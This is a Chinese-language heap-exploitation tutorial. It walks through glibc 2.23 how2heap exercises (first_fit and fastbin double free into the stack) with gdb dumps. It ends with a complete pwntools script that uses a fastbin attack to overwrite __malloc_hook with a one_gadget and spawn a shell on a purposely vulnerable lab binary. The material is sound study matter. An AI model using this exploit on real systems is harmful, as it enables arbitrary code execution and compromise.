> 原文链接: https://www.anquanke.com//post/id/192823 


# How2Heap堆利用学习笔记（一）


                                阅读量   
                                **1175012**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)

> 概述:对Linux下堆利用的学习记录，学习顺序大体是按照shellphish团队的how2heap的流程，尽量每个方面都调试的详尽一些，并结合案例进行分析。

## 环境准备

使用的是Ubuntu16.04，自带的glibc版本如下

```
$ file /lib/x86_64-linux-gnu/libc-2.23.so 

/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb, for GNU/Linux 2.6.32, stripped
```

官方的github

[https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)

```
$ git clone https://github.com/shellphish/how2heap.git
```

某些利用技术在2.25以上的gilbc上会失效，只能在glibc_2.25以下实现的技术也已经被分类放在对应文件夹下了，所以ubuntu16.04是一个比较合适的实验环境。

如果系统不符合，也可以自己编译合适版本glibc然后修改系统链接库的环境变量。

```
$ ls

calc_tcache_idx    first_fit    glibc_build.sh      malloc_playground

calc_tcache_idx.c  first_fit.c  glibc_ChangeLog.md  malloc_playground.c

fastbin_dup        glibc_2.25   glibc_run.sh        README.md

fastbin_dup.c      glibc_2.26   Makefile
```

进入目录进行$make，所有源代码都被编译成功。

查看MakeFile，都是使用本地的glibc进行的编译。

还可以手动添加参数CFLAGS += -fsanitize=address用于检测内存错误，个人感觉是类似win下pageheap的机制，用于更准确定位错误内存地址。

****MakeFile****

```
BASE = fastbin_dup malloc_playground first_fit calc_tcache_idx

V2.25 = glibc_2.25/fastbin_dup_into_stack glibc_2.25/fastbin_dup_consolidate glibc_2.25/unsafe_unlink glibc_2.25/house_of_spirit glibc_2.25/poison_null_byte glibc_2.25/house_of_lore glibc_2.25/overlapping_chunks glibc_2.25/overlapping_chunks_2 glibc_2.25/house_of_force glibc_2.25/large_bin_attack glibc_2.25/unsorted_bin_attack glibc_2.25/unsorted_bin_into_stack glibc_2.25/house_of_einherjar glibc_2.25/house_of_orange

V2.26 = glibc_2.26/unsafe_unlink glibc_2.26/house_of_lore glibc_2.26/overlapping_chunks glibc_2.26/large_bin_attack glibc_2.26/unsorted_bin_attack glibc_2.26/unsorted_bin_into_stack glibc_2.26/house_of_einherjar glibc_2.26/tcache_dup glibc_2.26/tcache_poisoning glibc_2.26/tcache_house_of_spirit

PROGRAMS = $(BASE) $(V2.25) $(V2.26)

CFLAGS += -std=c99 -g


# Convenience to auto-call mcheck before the first malloc()

#CFLAGS += -lmcheck

all: $(PROGRAMS)
clean:
​    rm -f $(PROGRAMS)
```



## 1.first_fit

漏洞类型:UAF(但无法利用)

第一题案例我们是无法干预程序行为但，目的是让我们熟悉堆分配机制。

在gdb中使用p main_arena可以看到程序中堆结构的细节。详见glibc源码。

案例源代码://省略了一部分无关输出

```
#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;string.h&gt;



int main()

`{`

​    fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.n");

​    char* a = malloc(0x512);

​    char* b = malloc(0x256);

​    char* c;



​    fprintf(stderr, "1st malloc(0x512): %pn", a);

​    fprintf(stderr, "2nd malloc(0x256): %pn", b);

​    fprintf(stderr, "we could continue mallocing here...n");

​    fprintf(stderr, "now let's put a string at a that we can read later "this is A!"n");

​    strcpy(a, "this is A!");

​    fprintf(stderr, "first allocation %p points to %sn", a, a);



​    fprintf(stderr, "Freeing the first one...n");

​    free(a);

​    fprintf(stderr, "So, let's allocate 0x500 bytesn");

​    c = malloc(506);

​    fprintf(stderr, "3rd malloc(0x500): %pn", c);

​    fprintf(stderr, "And put a different string here, "this is C!"n");

​    strcpy(c, "this is C!");

​    fprintf(stderr, "3rd allocation %p points to %sn", c, c);

​    fprintf(stderr, "first allocation %p points to %sn", a, a);

​    fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.n");

`}`
```

[![](https://s2.ax1x.com/2019/11/13/MG89C6.png)](https://s2.ax1x.com/2019/11/13/MG89C6.png)

### <a class="reference-link" name="%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"></a>流程分析

首先通过malloc分配两个内存，返回内存指针地址-0x10是chunk块的真正头部。

这两块内存相邻，header之间的距离正好是0x520字节。

```
gdb-peda$ x/5gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000521 --&gt;chunkA header
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000

gdb-peda$ x/5gx 0x603530-0x10

0x603520:    0x0000000000000000    0x0000000000000261 --&gt;chunkB header
0x603530:    0x0000000000000000    0x0000000000000000
0x603540:    0x0000000000000000

执行strcpy向chunkA写入”this is A!”,从内存指针起始地址写入数据。

gdb-peda$ x/5gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000521
0x603010:    0x2073692073696874    0x0000000000002141
0x603020:    0x0000000000000000
```

执行free释放chunkA之后，A内存没有被马上回收，而是链接到了unsorted bin中。

```
gdb-peda$ x/5gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000521 &lt;- chunkA [freed]
0x603010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78 &lt;- fd pointer,bk pointer
0x603020:    0x0000000000000000
```

查看unsorted bin

```
gdb-peda$ x/5gx 0x7ffff7dd1b78

0x7ffff7dd1b78 &lt;main_arena+88&gt;:    0x0000000000603780     0x0000000000000000
0x7ffff7dd1b88 &lt;main_arena+104&gt;:    0x0000000000603000     0x0000000000603000 -&gt;free chunk list
0x7ffff7dd1b98 &lt;main_arena+120&gt;:    0x00007ffff7dd1b88
```

重新malloc一块内存chunk_C,发现分配的内存块正是之前被释放的chunk_A内存。

虽然fd和bk指针依然存在，但是size值已经被改变了。

```
gdb-peda$ x/5gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000211
0x603010:    0x00007ffff7dd1fa8    0x00007ffff7dd1fa8
0x603020:    0x0000000000603000
```

此时访问unsorted bin,发现此时挂载在unsorted bin是chunk_A分割出来的一部分，因为申请的C空间小于chunk_A,就从A中分配了一部分给C，剩下的部分继续挂载在bins上。

```
gdb-peda$ x/5gx 0x7ffff7dd1b78

0x7ffff7dd1b78 &lt;main_arena+88&gt;:    0x0000000000603780     0x0000000000603210
0x7ffff7dd1b88 &lt;main_arena+104&gt;:    0x0000000000603210     0x0000000000603210 &lt;-unsorted bins

0x7ffff7dd1b98 &lt;main_arena+120&gt;:    0x00007ffff7dd1b88
gdb-peda$ x/5gx 0x603210
0x603210:    0x0000000000000000    0x0000000000000311 
0x603220:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
```

执行strcpy向chunk_C写入”this is C!”，内存中也找到了对象的字符串ASCII码。

```
gdb-peda$ x/5gx 0x603010-0x10
0x603000:    0x0000000000000000    0x0000000000000211
0x603010:    0x2073692073696874    0x00007ffff7002143
0x603020:    0x0000000000603000
```

此时的A指针仍然是存在的，所以可能会存在UAF漏洞，这个漏洞之前在分析IE漏洞的时候也分析过，就不再赘述了。



## 2.fastbin_dup_into_stack

漏洞类型fastbin_attack

背景知识:

Fast bins 主要是用于提高小内存的分配效率,使用单链表进行链接，默认情况下，对于 SIZE_SZ 为 4B 的平台， 小于 64B 的 chunk 分配请求，对于 SIZE_SZ 为 8B 的平台，小于 128B 的 chunk 分配请求，首先会查找 fast bins 中是否有所需大小的 chunk 存在(精确匹配)，如果存在，就直接返回。

简介:这个漏洞是我之前与堆溢出相识的第一道题，很不靠谱的以为这是UAF漏洞（当时概念不清）。Fastbin_attack主要是通过修改fd指针，伪造一个fake_chunk，实现对任意地址写。

源代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;


int main()
`{`

​    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc inton"

​           "returning a pointer to a controlled location (in this case, the stack).n");


​    unsigned long long stack_var;

​    fprintf(stderr, "The address we want malloc() to return is %p.n", 8+(char *)&amp;stack_var);
​    fprintf(stderr, "Allocating 3 buffers.n");

​    int *a = malloc(8);
​    int *b = malloc(8);
​    int *c = malloc(8);

​    fprintf(stderr, "1st malloc(8): %pn", a);
​    fprintf(stderr, "2nd malloc(8): %pn", b);
​    fprintf(stderr, "3rd malloc(8): %pn", c);
​    fprintf(stderr, "Freeing the first one...n");

​    free(a);
​    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.n", a, a);
​    // free(a);
​    fprintf(stderr, "So, instead, we'll free %p.n", b);
​    free(b);

​    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.n", a);
​    free(a);
​    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
​        "We'll now carry out our attack by modifying data at %p.n", a, b, a, a);
​    unsigned long long *d = malloc(8);

​    fprintf(stderr, "1st malloc(8): %pn", d);
​    fprintf(stderr, "2nd malloc(8): %pn", malloc(8));
​    fprintf(stderr, "Now the free list has [ %p ].n", a);
​    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.n"

​        "so now we are writing a fake free size (in this case, 0x20) to the stack,n"
​        "so that malloc will think there is a free chunk there and agree ton"
​        "return a pointer to it.n", a);
​    stack_var = 0x20;

​    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.n", a);
​    *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));

​    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free listn", malloc(8));
​    fprintf(stderr, "4th malloc(8): %pn", malloc(8));

`}`
```

### <a class="reference-link" name="%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"></a>流程分析

首先分配了三个大小相同的内存空间，分配内存大小为0x20（必为8的整数倍，并且最小为32字节）折柳使用gef插件，可以比较好的调试heap

```
gef➤  x/20gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000021 &lt;- chunk_A

0x603010:    0x0000000000000000    0x0000000000000000

0x603020:    0x0000000000000000    0x0000000000000021 &lt;-chunk_B

0x603030:    0x0000000000000000    0x0000000000000000

0x603040:    0x0000000000000000    0x0000000000000021 &lt;-chunk_C

0x603050:    0x0000000000000000    0x0000000000000000

0x603060:    0x0000000000000000    0x0000000000020fa1 &lt;-Top_chunk

0x603070:    0x0000000000000000    0x0000000000000000
```

第一次free内存a，查看内存本身并没有变化。因为fast bins是一个单链表，此时查看fast bins就能看到链表头。

```
gef➤  x/20gx 0x603010-0x10
0x603000:    0x0000000000000000    0x0000000000000021
0x603010:    0x0000000000000000    0x0000000000000000

gef➤  heap bin fast

─────[ Fastbins for arena 0x7ffff7dd1b20 ]────
Fastbin[0]  →   UsedChunk(addr=0x603010,size=0x20)  
Fastbin[1] 0x00
Fastbin[2] 0x00
```

第二次free b内存，因为如果fast bins链表头存放的是a的地址，那就无法再次释放a了。

此时fashbins链表已经将b内存插入到了链表头。

```
gef➤  x/20gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000021
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000021
0x603030:    0x0000000000603000    0x0000000000000000
0x603040:    0x0000000000000000    0x0000000000000021

Fastbin[0]  →   UsedChunk(addr=0x603030,size=0x20)   →   UsedChunk(addr=0x603010,size=0x20)
```

再次free a内存，此时fastbin形成了一个回路。此时完成一次double free操作，之后无论如何申请空间多少次，0x603010这个地址一直都在fastbin这个表中。这样便能完成对Free_Chunk的修改（对fd指针的修改）

```
Fastbin[0]  →   UsedChunk(addr=0x603010,size=0x20)   →   UsedChunk(addr=0x603030,size=0x20)   →UsedChunk(addr=0x603010,size=0x20) [无限循环略]
```

此时执行到unsigned long long *d = malloc(8)

再次将chunk_A原所在内存分配给了d

接下来再分配一次

聪明的读者到这里应该看得出，如果再分配几十次，也只会一直分配这两个地址。目前指针d已经指向了free_chunk_A(0x189e010)所以我们也就能修改其内容。

```
1st malloc(8): 0x189e010

2nd malloc(8): 0x189e030
```

Now the free list has [ 0x189e010 ].

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"></a>利用手法

接下里的步骤是整个攻击的关键，取stack_var-8的地址，写入d覆盖FD指针。

即伪造了一个fake_chunk（为绕过size检查，size的位置必须为0x20或0x21）

```
stack_var = 0x20;
*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));
```

反汇编代码如下

```
0x000000000040091a &lt;+628&gt;:    lea    rax,[rbp-0x30]
   0x000000000040091e &lt;+632&gt;:    sub    rax,0x8
   0x0000000000400922 &lt;+636&gt;:    mov    rdx,rax
   0x0000000000400925 &lt;+639&gt;:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400929 &lt;+643&gt;:    mov    QWORD PTR [rax],rdx
```

伪造了一个Free chunk，查看内存，与我们的模拟图一致。

```
+----------------------+----------------------+    &lt;----- chunk_d的FD ptr

|                              |                      |

|     prev_size           |      size(0x20)    |

|                               |                      |

+----------------------+----------------------+    

|                                                      |

|                   Unused                         |

|                                                      |

+----------------------+----------------------+

```

```
gef➤  x/20gx 0x603010-0x10

0x603000:    0x0000000000000000    0x0000000000000021

0x603010:    0x00007fffffffddc8    0x0000000000000000

0x603020:    0x0000000000000000    0x0000000000000021
```

到目前为止，已经完成了对fastbin_attack

```
Fastbin[0]  →   UsedChunk(addr=0x603010,size=0x20)   →   FreeChunk(addr=0x7fffffffddd8,size=0x20)   →   FreeChunk(addr=0x603020,size=0x0)
```

```
gef➤  x/20gx 0x7fffffffddd8-0x10
0x7fffffffddc8:    0x000000000040095c    0x0000000000000020
0x7fffffffddd8:    0x0000000000603010    0x0000000000603030
0x7fffffffdde8:    0x0000000000603050    0x0000000000603010
```

继续申请内存，此时分配掉了链表头的chunk，此时我们写入指向”任意”地址的freechunk终于排到了链表头部。

```
3rd malloc(8): 0x189e010, putting the stack address on the free list

Fastbin[0]  →   FreeChunk(addr=0x7fffffffddd8,size=0x20)   →   FreeChunk(addr=0x603020,size=0x0)
```

继续申请内存，成功malloc了一块内存到任意地址(有条件)，此时如果程序拥有对内存的读写操作，就能完成一次任意地址读写的操作。

```
4th malloc(8): 0x7fffffffddd8
```

纵观全局，这个例子是利用double free，来实现对fd指针的一个修改，实现fastbin_attack任意地址写（本案例的意愿应该是展示将数据写入栈帧）。Double free作为攻击方式可以看作UAF的一个子集，个人觉得这个案例如果是针对fastbin_attack技术，并不是最好的一个案例。因为Double free这个技术真的耀眼到宣兵夺主的地步了，所以下文对其进行修改，使用简单的堆溢出来实现fashbin_attack.

攻击对象比较常见的便是malloc_hook函数（将libc拖入IDA，查看exports即可找到）

利用手法可以参考我之前发在安全客的[文章](https://www.anquanke.com/post/id/176694#h3-5)<br>
[因为当时对堆不熟，有很多不严谨的地方]

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/11/13/MG8S4x.png)

### <a class="reference-link" name="%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"></a>案例分析

首先关闭ASLR，因为malloc_hook函数在libc中，会受到地址随机化的影响

```
# echo 0 &gt; /proc/sys/kernel/randomize_va_space
```

程序源码:

```
#include&lt;stdio.h&gt;

#include&lt;stdlib.h&gt;

int main()

`{`

​    int *a=malloc(0x60);
​    int *b=malloc(0x60);
​    int *c=malloc(0x60);
​    printf("1st malloc(0x60)-&gt;a, addr=%p n",a);
​    printf("2st malloc(0x60)-&gt;b, addr=%p n",b);
​    printf("3st malloc(x060)-&gt;c, addr=%p n",c);
​    free(c);
​    free(b);
​    printf("free b and c");

​    puts("heap overflow:");
​    read(0,a,0x200);
​    printf("a=%s",a);
​    int *d=malloc(0x60);
​    int *e=malloc(0x60);

​    puts("please write:");
​    read(0,e,0x64);
​    malloc(0x60);

`}`
```

通过查看内存可以找到

Malloc_hook偏移35字节，可以构成fake_chunk(size=0x7f)

```
gef➤  x/20xg 0x7ffff7dd1b10-35

0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:    0xfff7dd0260000000    0x000000000000007f  &lt;--fake_chunk
0x7ffff7dd1afd:    0xfff7a92e20000000    0xfff7a92a0000007f
0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:    0x000000000000007f    0x0000000000000000
0x7ffff7dd1b1d:    0x0100000000000000    0x0000000000000000
```

通过写入chunk_A，覆盖被Free的Chunk_B，修改其FD指针指向malloc_hook-35的fake_chunk

```
gef➤  heap bin fast

─────[ Fastbins for arena 0x7ffff7dd1b20 ]────
Fastbin[0] 0x00
...: 
Fastbin[5]  →   UsedChunk(addr=0x602080,size=0x70)   →   UsedChunk(addr=0x7ffff7dd1afd,size=0x7c)
```

接下来两次malloc，第二次malloc的时候，$rax被赋值0x00007ffff7dd1afd，就在malloc_hook-35的位置成了我们的内存空间（指针e）。此时向e写入35以上的字符就能malloc_hook的值。

结合我们获取的one_gadget，程序结尾调用malloc就会自动跳转到one_gadget.

PS:如果实战中的利用手法可以参考我IE漏洞分析UAF的[文章](https://www.anquanke.com/post/id/190590)，使用栈翻转来执行ROP链，利用原理都是通用的，此处不再赘述。

给出完整利用代码[仅限libc.2.23.so]

```
from pwn import *


p=process("./fastbins_attack")
gdb.attach(p,"b main")


malloc_hook=0x3c4b10
one_gadget=0x45216 # execve("/bin/sh", rsp+0x30, environ)
base=0x00007ffff7a0d000 #libc-2.23.so


payload1="A"*0x68
payload1+=p64(0x71)
payload1+=p64(malloc_hook+base-35)

print "malloc_hook="+str(malloc_hook)
print "[+]sending payload.."
#p.recvuntil("overflow:")
p.sendline(payload1)


print "[+]sending payload2.."
payload2="A"*(35-16)+p64(one_gadget+base)
p.recvuntil("write:")
p.sendline(payload2)

p.interactive()
```

覆盖malloc_hook为one_gadget地址

```
gef➤  x/10gx 0x7ffff7dd1b10
0x7ffff7dd1b10 &lt;__malloc_hook&gt;:    0x00007ffff7a52216    0x000000000000000a
```

继续运行便返回一个shell

```
gef➤  n
process 66236 is executing new program: /bin/dash
```



## 参考文献:

[1]fastbin attack漏洞之__malloc_hook攻击

[https://blog.csdn.net/qq_41453285/article/details/99321101](https://blog.csdn.net/qq_41453285/article/details/99321101)

[2]银河实验室.浅析Linux堆溢出之fastbin,[https://www.freebuf.com/news/88660.html](https://www.freebuf.com/news/88660.html)

[3]华庭(庄明强).《glibc内存管理ptmalloc2源代码分析》2011-4-17

[![](https://p1.ssl.qhimg.com/t012c03e81bc9250cae.jpg)](https://p1.ssl.qhimg.com/t012c03e81bc9250cae.jpg)
